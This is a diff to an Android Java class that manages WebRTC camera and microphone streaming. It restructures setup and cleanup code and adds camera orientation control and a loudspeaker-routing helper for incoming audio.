@@ -12,15 +12,10 @@ import java.util.List;
 public class WebRtcStreamManager {
     private static final String TAG = "WebRtcStream";
     private static WebRtcStreamManager instance;
-    private PeerConnectionFactory factory; private PeerConnection peerConnection;
-    private VideoCapturer videoCapturer; private VideoSource videoSource;
-    private SurfaceTextureHelper surfaceTextureHelper; private AudioSource audioSource;
-    private VideoTrack localVideoTrack; private AudioTrack localAudioTrack;
-    private EglBase eglBase; private Context appContext;
-    private boolean isFrontCamera = true, hasRemoteDesc = false;
-    private String activeServerUrl, activeDeviceId;
-    private PowerManager.WakeLock wakeLock; private WifiManager.WifiLock wifiLock;
-    private final List<IceCandidate> pendingCandidates = new ArrayList<>();
+    private PeerConnectionFactory factory; private PeerConnection peerConnection; private VideoCapturer videoCapturer; private VideoSource videoSource;
+    private SurfaceTextureHelper surfaceTextureHelper; private AudioSource audioSource; private VideoTrack localVideoTrack; private AudioTrack localAudioTrack;
+    private EglBase eglBase; private Context appContext; private boolean isFrontCamera = true, hasRemoteDesc = false;
+    private String activeServerUrl, activeDeviceId; private PowerManager.WakeLock wakeLock; private WifiManager.WifiLock wifiLock; private final List<IceCandidate> pendingCandidates = new ArrayList<>();
 
     private WebRtcStreamManager() {}
     public static synchronized WebRtcStreamManager getInstance() { return instance == null ? (instance = new WebRtcStreamManager()) : instance; }
@@ -35,9 +30,6 @@ public class WebRtcStreamManager {
         try {
             android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
             if (am != null) { am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION); am.setSpeakerphoneOn(true); }
-        } catch (Throwable ignored) {}
-
-        try {
             PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(ctx).createInitializationOptions());
             try { eglBase = EglBase.create(); } catch (Exception e) { eglBase = null; }
             PeerConnectionFactory.Builder b = PeerConnectionFactory.builder();
@@ -55,7 +47,7 @@ public class WebRtcStreamManager {
                 @Override public void onIceCandidatesRemoved(IceCandidate[] ics) {}
                 @Override public void onAddStream(MediaStream ms) {
                     if (ms != null && ms.audioTracks != null && ms.audioTracks.size() > 0) {
-                        try { ms.audioTracks.get(0).setEnabled(true); ms.audioTracks.get(0).setVolume(10.0); } catch (Throwable ignored) {}
+                        try { ms.audioTracks.get(0).setEnabled(true); ms.audioTracks.get(0).setVolume(10.0); enableLoudspeaker(appContext != null ? appContext : ctx); } catch (Throwable ignored) {}
                     }
                 }
                 @Override public void onRemoveStream(MediaStream ms) {} @Override public void onDataChannel(DataChannel dc) {} @Override public void onRenegotiationNeeded() {}
@@ -69,17 +61,13 @@ public class WebRtcStreamManager {
                     peerConnection.addTrack(localAudioTrack = factory.createAudioTrack("ARDAMSa0", audioSource = factory.createAudioSource(ac)));
                 } catch (Throwable t) { Log.e(TAG, "Audio error", t); }
             }
-
-            if (video) {
+            if (video && (videoCapturer = createCameraCapturer(ctx, front)) != null) {
                 try {
-                    videoCapturer = createCameraCapturer(ctx, front);
-                    if (videoCapturer != null) {
-                        surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase != null ? eglBase.getEglBaseContext() : null);
-                        videoSource = factory.createVideoSource(videoCapturer.isScreencast());
-                        videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
-                        videoCapturer.startCapture(640, 360, 15);
-                        peerConnection.addTrack(localVideoTrack = factory.createVideoTrack("ARDAMSv0", videoSource));
-                    }
+                    surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase != null ? eglBase.getEglBaseContext() : null);
+                    videoSource = factory.createVideoSource(videoCapturer.isScreencast());
+                    videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
+                    videoCapturer.startCapture(640, 360, 15);
+                    peerConnection.addTrack(localVideoTrack = factory.createVideoTrack("ARDAMSv0", videoSource));
                 } catch (Throwable t) { Log.e(TAG, "Video error", t); }
             }
         } catch (Exception e) { stopLiveStream(); }
@@ -99,10 +87,28 @@ public class WebRtcStreamManager {
     }
 
     public synchronized void switchCamera() {
-        if (videoCapturer instanceof CameraVideoCapturer) {
-            ((CameraVideoCapturer) videoCapturer).switchCamera(null);
-            isFrontCamera = !isFrontCamera;
-        }
+        if (videoCapturer instanceof CameraVideoCapturer) { ((CameraVideoCapturer) videoCapturer).switchCamera(null); isFrontCamera = !isFrontCamera; }
+    }
+
+    public synchronized void setOrientation(String ori) {
+        if (videoCapturer == null) return;
+        try { if ("landscape".equalsIgnoreCase(ori)) videoCapturer.changeCaptureFormat(640, 360, 15); else videoCapturer.changeCaptureFormat(360, 640, 15); } catch (Throwable ignored) {}
+    }
+
+    private void enableLoudspeaker(Context ctx) {
+        if (ctx == null) return;
+        try {
+            android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) return;
+            am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION);
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                for (android.media.AudioDeviceInfo d : am.getAvailableCommunicationDevices()) {
+                    if (d.getType() == android.media.AudioDeviceInfo.TYPE_BUILTIN_SPEAKER) { am.setCommunicationDevice(d); break; }
+                }
+            }
+            am.setSpeakerphoneOn(true);
+            am.setStreamVolume(android.media.AudioManager.STREAM_VOICE_CALL, am.getStreamMaxVolume(android.media.AudioManager.STREAM_VOICE_CALL), 0);
+        } catch (Throwable ignored) {}
     }
 
     public synchronized void handleRemoteOffer(String sdpDescription) {
@@ -120,7 +126,7 @@ public class WebRtcStreamManager {
                         final String fSdp = sdp;
                         peerConnection.setLocalDescription(new SimpleSdpObserver() {
                             @Override public void onSetSuccess() {
-                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                     SessionDescription loc = peerConnection != null ? peerConnection.getLocalDescription() : null;
                                     sendSignal("answer", (loc != null && loc.description != null) ? loc.description : fSdp, null);
                                 }, 600);
@@ -177,17 +183,11 @@ public class WebRtcStreamManager {
                 } catch (Throwable ignored) {}
                 appContext = null;
             }
-            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); wakeLock = null;
-            if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); wifiLock = null;
-            if (videoCapturer != null) videoCapturer.stopCapture(); videoCapturer = null;
-            if (surfaceTextureHelper != null) surfaceTextureHelper.dispose(); surfaceTextureHelper = null;
-            if (localVideoTrack != null) localVideoTrack.dispose(); localVideoTrack = null;
-            if (videoSource != null) videoSource.dispose(); videoSource = null;
-            if (localAudioTrack != null) localAudioTrack.dispose(); localAudioTrack = null;
-            if (audioSource != null) audioSource.dispose(); audioSource = null;
-            if (peerConnection != null) peerConnection.close(); peerConnection = null;
-            if (factory != null) factory.dispose(); factory = null;
-            if (eglBase != null) eglBase.release(); eglBase = null;
+            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); wakeLock = null; if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); wifiLock = null;
+            if (videoCapturer != null) { videoCapturer.stopCapture(); videoCapturer = null; } if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose(); surfaceTextureHelper = null; }
+            if (localVideoTrack != null) { localVideoTrack.dispose(); localVideoTrack = null; } if (videoSource != null) { videoSource.dispose(); videoSource = null; }
+            if (localAudioTrack != null) { localAudioTrack.dispose(); localAudioTrack = null; } if (audioSource != null) { audioSource.dispose(); audioSource = null; }
+            if (peerConnection != null) { peerConnection.close(); peerConnection = null; } if (factory != null) { factory.dispose(); factory = null; } if (eglBase != null) { eglBase.release(); eglBase = null; }
         } catch (Exception ignored) {}
     }
 
